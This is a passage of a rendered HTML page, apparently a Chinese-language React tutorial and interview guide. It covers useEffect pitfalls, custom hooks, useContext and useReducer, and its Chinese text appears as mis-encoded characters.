title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šå¦‚ä½•é¿å… useEffect æ— é™å¾ªç¯ï¼Ÿ</strong></p><p>å¸¸è§åŸå› ï¼š</p><ul><li>å‰¯ä½œç”¨å†…æ›´æ–°ä¾èµ–é¡¹çŠ¶æ€</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ å±é™©ï¼šæ›´æ–°çŠ¶æ€è§¦å‘é‡æ¸²æŸ“</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>); <br>&#125;, [count]); <span class="hljs-comment">// æ¯æ¬¡countå˜åŒ–åˆè§¦å‘</span><br></code></pre></td></tr></table></figure><ul><li>ä¾èµ–å¼•ç”¨ç±»å‹æœªä¼˜åŒ–</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ å¯¹è±¡å­—é¢é‡å¯¼è‡´æ— é™å¾ªç¯</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;, [&#123; data &#125;]); <span class="hljs-comment">// æ¯æ¬¡æ–°å¯¹è±¡</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âœ… æ–¹æ¡ˆ1ï¼šæ£€æŸ¥ä¾èµ–é“¾ï¼Œç§»é™¤ä¸å¿…è¦çš„çŠ¶æ€æ›´æ–°</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (needsUpdate) <span class="hljs-title function_">fetchData</span>(); <span class="hljs-comment">// æ¡ä»¶æ‰§è¡Œ</span><br>&#125;, [data]);<br><br><span class="hljs-comment">// âœ… æ–¹æ¡ˆ2ï¼šä½¿ç”¨ useMemo ç¨³å®šä¾èµ–</span><br><span class="hljs-keyword">const</span> stableData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> data, [data.<span class="hljs-property">id</span>]);<br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<span class="hljs-comment">/*...*/</span>&#125;, [stableData]);<br></code></pre></td></tr></table></figure><p><strong>Qï¼šä¸ºä»€ä¹ˆä¸¥æ ¼æ¨¡å¼ä¸‹ useEffect æ‰§è¡Œä¸¤æ¬¡ï¼Ÿ</strong></p><p>React 18 ä¸¥æ ¼æ¨¡å¼è¡Œä¸ºï¼š</p><ul><li>å¼€å‘ç¯å¢ƒæ•…æ„åŒè°ƒç”¨ç»„ä»¶ï¼ˆæŒ‚è½½ â†’ å¸è½½ â†’ æŒ‚è½½ï¼‰</li><li>ç›®çš„ï¼šæš´éœ²æœªæ­£ç¡®æ¸…ç†çš„å‰¯ä½œç”¨</li><li>ç”Ÿäº§ç¯å¢ƒæ— æ­¤è¡Œä¸º</li></ul><p>æ­£ç¡®åº”å¯¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> connection = <span class="hljs-title function_">createConnection</span>();<br>  connection.<span class="hljs-title function_">connect</span>();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> connection.<span class="hljs-title function_">disconnect</span>(); <span class="hljs-comment">// âœ… ç¡®ä¿å®Œå…¨æ¸…ç†</span><br>&#125;, []);<br></code></pre></td></tr></table></figure><p><strong>Qï¼šuseEffect å’Œ useLayoutEffect æœ‰ä½•åŒºåˆ«ï¼Ÿ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">useEffect</th><th align="left">useLayoutEffect</th></tr></thead><tbody><tr><td align="left">æ‰§è¡Œæ—¶æœº</td><td align="left">æµè§ˆå™¨ç»˜åˆ¶åå¼‚æ­¥æ‰§è¡Œ</td><td align="left">DOM æ›´æ–°åï¼Œç»˜åˆ¶å‰åŒæ­¥æ‰§è¡Œ</td></tr><tr><td align="left">é˜»å¡æ¸²æŸ“</td><td align="left">å¦</td><td align="left">æ˜¯</td></tr><tr><td align="left">ä½¿ç”¨åœºæ™¯</td><td align="left">æ•°æ®è·å–ã€è®¢é˜…ç­‰</td><td align="left">DOM æµ‹é‡ã€åŒæ­¥æ ·å¼å˜æ›´</td></tr><tr><td align="left">æœåŠ¡ç«¯æ¸²æŸ“</td><td align="left">æ­£å¸¸æ‰§è¡Œ</td><td align="left">è­¦å‘Šï¼ˆéœ€ç”¨ useEffect æ›¿ä»£ï¼‰</td></tr></tbody></table><h3 id="è‡ªå®šä¹‰-Hook-å°è£…"><a href="#è‡ªå®šä¹‰-Hook-å°è£…" class="headerlink" title="è‡ªå®šä¹‰ Hook å°è£…"></a>è‡ªå®šä¹‰ Hook å°è£…</h3><p><strong>é€šç”¨æ•°æ®è¯·æ±‚ Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useFetch</span>(<span class="hljs-params">url, initialData</span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(initialData);<br>  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> isActive = <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url);<br>        <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setData</span>(<span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>());<br>      &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);<br>      &#125;<br>    &#125;;<br>    <br>    <span class="hljs-title function_">fetchData</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123; isActive = <span class="hljs-literal">false</span> &#125;;<br>  &#125;, [url]);<br>  <br>  <span class="hljs-keyword">return</span> &#123; data, loading &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> &#123; data, loading &#125; = <span class="hljs-title function_">useFetch</span>(<span class="hljs-string">&#x27;/api/user&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>äº‹ä»¶ç›‘å¬ Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useEventListener</span>(<span class="hljs-params">eventName, handler, element = <span class="hljs-variable language_">window</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> savedHandler = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    savedHandler.<span class="hljs-property">current</span> = handler;<br>  &#125;, [handler]);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">eventListener</span> = e =&gt; savedHandler.<span class="hljs-title function_">current</span>(e);<br>    element.<span class="hljs-title function_">addEventListener</span>(eventName, eventListener);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> element.<span class="hljs-title function_">removeEventListener</span>(eventName, eventListener);<br>  &#125;, [eventName, element]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-useContext-ä¸å…¨å±€çŠ¶æ€å…±äº«"><a href="#3-3-useContext-ä¸å…¨å±€çŠ¶æ€å…±äº«" class="headerlink" title="3.3 useContext ä¸å…¨å±€çŠ¶æ€å…±äº«"></a>3.3 useContext ä¸å…¨å±€çŠ¶æ€å…±äº«</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°-6"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°-6" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><p>useContext ä½œç”¨ï¼šè§£å†³ç»„ä»¶è·¨å±‚çº§é€šä¿¡é—®é¢˜ï¼Œé¿å… Props drillingï¼ˆå±æ€§é’»æ¢ï¼‰</p><p>æ ¸å¿ƒä¸‰è¦ç´ </p><ul><li>React.createContext()ï¼šåˆ›å»ºä¸Šä¸‹æ–‡å¯¹è±¡</li><li><code>&lt;Context.Provider&gt;</code>ï¼šæä¾›æ•°æ®</li><li>useContext()ï¼šæ¶ˆè´¹æ•°æ®</li></ul><p>å…¸å‹åœºæ™¯:ä¸»é¢˜åˆ‡æ¢ã€ç”¨æˆ·è®¤è¯ã€å¤šè¯­è¨€ã€å…¨å±€é…ç½®ç­‰è·¨ç»„ä»¶å…±äº«æ•°æ®</p><h3 id="ä¸Šä¸‹æ–‡å·¥ä½œæµç¨‹è¯¦è§£"><a href="#ä¸Šä¸‹æ–‡å·¥ä½œæµç¨‹è¯¦è§£" class="headerlink" title="ä¸Šä¸‹æ–‡å·¥ä½œæµç¨‹è¯¦è§£"></a>ä¸Šä¸‹æ–‡å·¥ä½œæµç¨‹è¯¦è§£</h3><pre class="mermaid">graph TD  A[åˆ›å»ºContext] --> B[Provider æä¾›æ•°æ®]  B --> C[å­ç»„ä»¶æ¶ˆè´¹æ•°æ®]  C --> D{æ¶ˆè´¹æ–¹å¼}  D --> E[useContext Hook]  D --> F[Context.Consumer]  D --> G[Class.contextType]</pre><p>å®Œæ•´ä½¿ç”¨ç¤ºä¾‹:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. åˆ›å»ºä¸Šä¸‹æ–‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>); <span class="hljs-comment">// é»˜è®¤å€¼</span><br><br><span class="hljs-comment">// 2. Provider æä¾›æ•°æ®</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;dark&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">setTheme</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 3. å‡½æ•°ç»„ä»¶æ¶ˆè´¹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span>æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 4. ç±»ç»„ä»¶æ¶ˆè´¹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Content</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-keyword">static</span> contextType = <span class="hljs-title class_">ThemeContext</span>; <span class="hljs-comment">// ç±»ç»„ä»¶ç»‘å®š</span><br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span>å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜çº§åº”ç”¨æ¨¡å¼"><a href="#é«˜çº§åº”ç”¨æ¨¡å¼" class="headerlink" title="é«˜çº§åº”ç”¨æ¨¡å¼"></a>é«˜çº§åº”ç”¨æ¨¡å¼</h3><p><strong>è‡ªå®šä¹‰ Hook å°è£…</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºè‡ªå®šä¹‰ä¸Šä¸‹æ–‡ Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useTheme</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> context = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <span class="hljs-keyword">if</span> (!context) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;useTheme å¿…é¡»åœ¨ ThemeProvider å†…ä½¿ç”¨&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> context;<br>&#125;<br><br><span class="hljs-comment">// åœ¨ç»„ä»¶ä¸­ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemedButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme, toggleTheme &#125; = <span class="hljs-title function_">useTheme</span>();<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;toggleTheme&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">      åˆ‡æ¢ä¸»é¢˜</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-8"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-8" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šContext ä¸ Redux å¦‚ä½•é€‰æ‹©ï¼Ÿ</strong></p><p>å†³ç­–çŸ©é˜µï¼š</p><table><thead><tr><th align="left">è€ƒé‡å› ç´ </th><th align="left">Context</th><th align="left">Redux</th></tr></thead><tbody><tr><td align="left">ä½¿ç”¨å¤æ‚åº¦</td><td align="left">ç®€å•</td><td align="left">å¤æ‚ï¼ˆaction&#x2F;reducerï¼‰</td></tr><tr><td align="left">æ€§èƒ½ä¼˜åŒ–</td><td align="left">éœ€æ‰‹åŠ¨ä¼˜åŒ–</td><td align="left">å†…ç½®ç²¾ç»†æ›´æ–°</td></tr><tr><td align="left">ä¸­é—´ä»¶æ”¯æŒ</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æ”¯æŒï¼ˆthunk&#x2F;sagaï¼‰</td></tr><tr><td align="left">è°ƒè¯•å·¥å…·</td><td align="left">æ— </td><td align="left">Redux DevTools</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">ä½é¢‘æ›´æ–°æ•°æ®ï¼ˆä¸»é¢˜&#x2F;ç”¨æˆ·ï¼‰</td><td align="left">é«˜é¢‘æ›´æ–°&#x2F;å¤æ‚çŠ¶æ€é€»è¾‘</td></tr></tbody></table><p>æ€»ç»“ï¼š</p><ul><li>ä¸­å°åº”ç”¨ï¼šContext + useReducer</li><li>å¤§å‹åº”ç”¨ï¼šRedux&#x2F;Zustand</li></ul><p><strong>Qï¼šä¸ºä»€ä¹ˆ Context ä¼šå¯¼è‡´ä¸å¿…è¦çš„é‡æ¸²æŸ“ï¼Ÿ</strong></p><p>æ ¹æœ¬åŸå› ï¼š</p><p>Context ä½¿ç”¨ å€¼æ¯”è¾ƒï¼ˆvalue comparisonï¼‰ï¼Œå½“ Provider çš„ value å˜åŒ–æ—¶ï¼Œæ‰€æœ‰æ¶ˆè´¹è¯¥ Context çš„ç»„ä»¶éƒ½ä¼šé‡æ¸²æŸ“ï¼Œæ— è®ºæ˜¯å¦ä½¿ç”¨å˜åŒ–çš„éƒ¨åˆ†ã€‚</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. æ‹†åˆ† Contextï¼ˆå¦‚å‰æ–‡ç¤ºä¾‹ï¼‰</span><br><span class="hljs-comment">// 2. ä½¿ç”¨ React.memo ä¼˜åŒ–å­ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ExpensiveComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">() =&gt;</span> &#123; ... &#125;);<br><br><span class="hljs-comment">// 3. ä½¿ç”¨é€‰æ‹©å™¨åº“ï¼ˆuse-context-selectorï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>Qï¼šå¦‚ä½•æ£€æµ‹ Context æœªæä¾›ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºæ—¶è®¾ç½®é»˜è®¤å€¼ï¼ˆç”Ÿäº§ç¯å¢ƒæœ‰ç”¨ï¼‰</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br><br><span class="hljs-comment">// è‡ªå®šä¹‰ Hook æ·»åŠ æ£€æµ‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useTheme</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> context = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <br>  <span class="hljs-keyword">if</span> (context === <span class="hljs-literal">undefined</span>) &#123; <span class="hljs-comment">// æœªæä¾›æ—¶ä½¿ç”¨é»˜è®¤å€¼</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;light&#x27;</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> context;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-4-useReducer-ä¸å¤æ‚çŠ¶æ€é€»è¾‘"><a href="#3-4-useReducer-ä¸å¤æ‚çŠ¶æ€é€»è¾‘" class="headerlink" title="3.4 useReducer ä¸å¤æ‚çŠ¶æ€é€»è¾‘"></a>3.4 useReducer ä¸å¤æ‚çŠ¶æ€é€»è¾‘</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°-7"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°-7" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><p>useReducer ä½œç”¨ï¼šç®¡ç†å¤æ‚çŠ¶æ€é€»è¾‘çš„ Hookï¼Œæ˜¯ useState çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå€Ÿé‰´ Redux çš„æ ¸å¿ƒæ€æƒ³</p><p>æ ¸å¿ƒå‚æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState, initFunc);<br></code></pre></td></tr></table></figure><ul><li>reducerï¼šçŠ¶æ€æ›´æ–°å‡½æ•° (state, action) &#x3D;&gt; newState</li><li>initialStateï¼šåˆå§‹çŠ¶æ€</li><li>initFuncï¼šæƒ°æ€§åˆå§‹åŒ–å‡½æ•°ï¼ˆå¯é€‰ï¼‰</li></ul><p>ä¸‰å¤§è¦ç´ :</p><ul><li>Stateï¼šåº”ç”¨çš„çŠ¶æ€æ•°æ®</li><li>Actionï¼šæè¿°çŠ¶æ€å˜åŒ–çš„æ™®é€šå¯¹è±¡</li><li>Dispatchï¼šè§¦å‘çŠ¶æ€æ›´æ–°çš„å‡½æ•° dispatch(action)</li></ul><h3 id="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ-3"><a href="#æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ-3" class="headerlink" title="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ"></a>æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ</h3><p><strong>Reducer å‡½æ•°å·¥ä½œåŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å…¸å‹ reducer ç»“æ„</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;set_user&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">user</span>: action.<span class="hljs-property">payload</span> &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state; <span class="hljs-comment">// å¿…é¡»è¿”å›é»˜è®¤çŠ¶æ€</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€æ›´æ–°æµç¨‹</strong></p><pre class="mermaid">sequenceDiagram  participant Component as ç»„ä»¶  participant Reducer as Reducerå‡½æ•°  participant React as Reactè¿è¡Œæ—¶    Component->>Reducer: dispatch({ type: 'increment' })  Reducer->>Reducer: è®¡ç®—æ–°çŠ¶æ€ (state + 1)  Reducer->>React: è¿”å›æ–°çŠ¶æ€  React->>Component: è§¦å‘é‡æ¸²æŸ“</pre><p><strong>ä¸ useState å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">useReducer</th><th align="left">useState</th></tr></thead><tbody><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">å¤æ‚çŠ¶æ€é€»è¾‘</td><td align="left">ç®€å•çŠ¶æ€</td></tr><tr><td align="left">çŠ¶æ€ç»“æ„</td><td align="left">å¯¹è±¡&#x2F;å¤æ‚ç»“æ„</td><td align="left">ä»»æ„ç±»å‹</td></tr><tr><td align="left">æ›´æ–°é€»è¾‘</td><td align="left">é›†ä¸­ç®¡ç†ï¼ˆreducerï¼‰</td><td align="left">åˆ†æ•£åœ¨ç»„ä»¶ä¸­</td></tr><tr><td align="left">æ€§èƒ½ä¼˜åŒ–</td><td align="left">å®¹æ˜“é¿å…ä¸å¿…è¦æ›´æ–°</td><td align="left">éœ€æ‰‹åŠ¨ä¼˜åŒ–</td></tr><tr><td align="left">æµ‹è¯•</td><td align="left">çº¯å‡½æ•°æ˜“äºæµ‹è¯•</td><td align="left">éœ€æ¸²æŸ“ç»„ä»¶æµ‹è¯•</td></tr></tbody></table><h3 id="é«˜çº§åº”ç”¨æ¨¡å¼-1"><a href="#é«˜çº§åº”ç”¨æ¨¡å¼-1" class="headerlink" title="é«˜çº§åº”ç”¨æ¨¡å¼"></a>é«˜çº§åº”ç”¨æ¨¡å¼</h3><p><strong>ä¸­é—´ä»¶æ¨¡å¼ï¼ˆç±»ä¼¼ Reduxï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¢å¼º dispatch å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useReducerWithMiddleware</span>(<span class="hljs-params">reducer, initialState</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title 